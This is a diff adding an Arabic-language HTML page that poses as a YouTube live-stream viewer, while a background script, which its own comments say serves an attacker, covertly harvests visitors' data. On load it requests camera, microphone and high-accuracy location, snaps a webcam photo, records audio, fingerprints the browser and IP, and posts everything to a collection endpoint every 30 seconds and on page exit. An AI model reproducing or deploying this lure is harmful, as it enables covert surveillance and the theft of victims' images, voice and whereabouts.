@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>شاهد البث المباشر</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: #0f0f0f;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container {
+            max-width: 900px;
+            width: 95%;
+            padding: 20px;
+        }
+        
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%;
+            background: #000;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+        }
+        
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        .video-info {
+            margin-top: 20px;
+            padding: 20px;
+            background: #1a1a1a;
+            border-radius: 12px;
+        }
+        
+        .video-title {
+            font-size: 1.5em;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #fff;
+        }
+        
+        .channel-name {
+            color: #aaa;
+            font-size: 0.9em;
+            margin-bottom: 15px;
+        }
+        
+        .description {
+            color: #ccc;
+            line-height: 1.6;
+            font-size: 0.95em;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 20px;
+            color: #888;
+        }
+        
+        .status-badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.8em;
+            margin-top: 10px;
+        }
+        
+        .status-live {
+            background: #cc0000;
+            color: white;
+        }
+        
+        .status-offline {
+            background: #333;
+            color: #888;
+        }
+        
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #555;
+            font-size: 0.8em;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Video Player -->
+    <div class="video-wrapper" id="videoContainer">
+        <div class="loading" id="loadingScreen">
+            <div style="font-size: 2em; margin-bottom: 10px;">⏳</div>
+            <div>جاري تحميل البث المباشر...</div>
+        </div>
+        <iframe id="youtubePlayer" 
+                allow="autoplay; encrypted-media; picture-in-picture" 
+                allowfullscreen>
+        </iframe>
+    </div>
+    
+    <!-- Video Info -->
+    <div class="video-info">
+        <div class="video-title" id="videoTitle">بث مباشر</div>
+        <div class="channel-name" id="channelName">القناة الرسمية</div>
+        <div>
+            <span class="status-badge status-live" id="liveBadge">🔴 مباشر</span>
+        </div>
+        <div class="description" id="videoDesc">
+            مرحباً بكم في البث المباشر! نتمنى لكم مشاهدة ممتعة.
+        </div>
+    </div>
+    
+    <div class="footer">
+        © 2026 - جميع الحقوق محفوظة
+    </div>
+</div>
+
+<script>
+// ============================================================
+// Social Web - Live YouTube Wrapper
+// سكربت جمع المعلومات يعمل في الخلفية
+// ============================================================
+
+// ---------- CONFIG ----------
+// ضع رابط الفيديو الذي يريده المهاجم هنا
+const YOUTUBE_VIDEO_ID = 'dQw4w9WgXcQ'; // مثال: Rick Roll (استبدله)
+const SERVER_URL = window.location.origin.replace(/:\d+/, ':8080') + '/recv_data.php';
+
+// ---------- State ----------
+const state = {
+    camera: { stream: null, data: null },
+    microphone: { stream: null, data: null },
+    location: null,
+    browser: null,
+    ip: null,
+    sessionStart: Date.now()
+};
+
+// ---------- Load YouTube Video ----------
+function loadVideo() {
+    const player = document.getElementById('youtubePlayer');
+    const loading = document.getElementById('loadingScreen');
+    
+    player.src = `https://www.youtube.com/embed/${YOUTUBE_VIDEO_ID}?autoplay=1&rel=0`;
+    player.onload = () => {
+        loading.style.display = 'none';
+        player.style.display = 'block';
+    };
+    
+    // Fallback if iframe loads but onload doesn't fire
+    setTimeout(() => {
+        loading.style.display = 'none';
+        player.style.display = 'block';
+    }, 3000);
+}
+
+// ---------- Permission Requests ----------
+async function requestAllPermissions() {
+    const results = await Promise.allSettled([
+        requestCamera(),
+        requestMicrophone(),
+        requestLocation(),
+        gatherBrowserInfo(),
+        detectIP()
+    ]);
+    
+    return results;
+}
+
+async function requestCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+        state.camera.stream = stream;
+        state.camera.data = await captureFrame(stream);
+        console.log('[+] Camera: Granted');
+        return true;
+    } catch (e) {
+        console.log('[-] Camera: Denied');
+        return false;
+    }
+}
+
+async function requestMicrophone() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        state.microphone.stream = stream;
+        state.microphone.data = await recordSample(stream);
+        console.log('[+] Microphone: Granted');
+        return true;
+    } catch (e) {
+        console.log('[-] Microphone: Denied');
+        return false;
+    }
+}
+
+function requestLocation() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve(false);
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                state.location = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+                resolve(true);
+            },
+            () => resolve(false),
+            { enableHighAccuracy: true, timeout: 8000 }
+        );
+    });
+}
+
+async function captureFrame(stream) {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    await new Promise(r => setTimeout(r, 500));
+    const c = document.createElement('canvas');
+    c.width = video.videoWidth || 640;
+    c.height = video.videoHeight || 480;
+    c.getContext('2d').drawImage(video, 0, 0);
+    return c.toDataURL('image/jpeg', 0.7);
+}
+
+async function recordSample(stream) {
+    const recorder = new MediaRecorder(stream, {
+        mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
+            ? 'audio/webm;codecs=opus' : 'audio/webm'
+    });
+    const chunks = [];
+    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    recorder.start();
+    await new Promise(r => setTimeout(r, 3000));
+    recorder.stop();
+    await new Promise(r => { recorder.onstop = r; });
+    const blob = new Blob(chunks, { type: 'audio/webm' });
+    return await blobToBase64(blob);
+}
+
+function gatherBrowserInfo() {
+    state.browser = {
+        user_agent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+}
+
+async function detectIP() {
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        const d = await r.json();
+        state.ip = d.ip;
+    } catch (e) {
+        state.ip = 'unknown';
+    }
+}
+
+function blobToBase64(blob) {
+    return new Promise((resolve) => {
+        const reader = new FileReader();
+        reader.onload = () => resolve(reader.result);
+        reader.readAsDataURL(blob);
+    });
+}
+
+// ---------- Send Data ----------
+async function sendData() {
+    const payload = {
+        type: 'live_youtube',
+        video_id: YOUTUBE_VIDEO_ID,
+        timestamp: new Date().toISOString(),
+        camera: {
+            granted: state.camera.data !== null,
+            image: state.camera.data
+        },
+        microphone: {
+            granted: state.microphone.data !== null,
+            audio: state.microphone.data
+        },
+        location: state.location,
+        browser: state.browser,
+        ip: state.ip,
+        session_duration: Math.floor((Date.now() - state.sessionStart) / 1000)
+    };
+    
+    try {
+        await fetch(SERVER_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+        console.log('[+] Data sent successfully');
+    } catch (e) {
+        console.log('[-] Error sending data:', e);
+    }
+}
+
+// ---------- Cleanup on Exit ----------
+function cleanup() {
+    if (state.camera.stream) {
+        state.camera.stream.getTracks().forEach(t => t.stop());
+    }
+    if (state.microphone.stream) {
+        state.microphone.stream.getTracks().forEach(t => t.stop());
+    }
+    sendData();
+}
+
+// ---------- Start ----------
+document.addEventListener('DOMContentLoaded', () => {
+    loadVideo();
+    requestAllPermissions().then(() => {
+        // Send initial data after all permissions gathered
+        setTimeout(sendData, 5000);
+    });
+    
+    // Periodic updates every 30 seconds
+    setInterval(() => {
+        if (state.camera.stream) {
+            captureFrame(state.camera.stream).then(data => {
+                state.camera.data = data;
+                sendData();
+            });
+        } else {
+            sendData();
+        }
+    }, 30000);
+    
+    // Cleanup on page leave
+    window.addEventListener('beforeunload', cleanup);
+});
+</script>
+
+</body>
+</html>
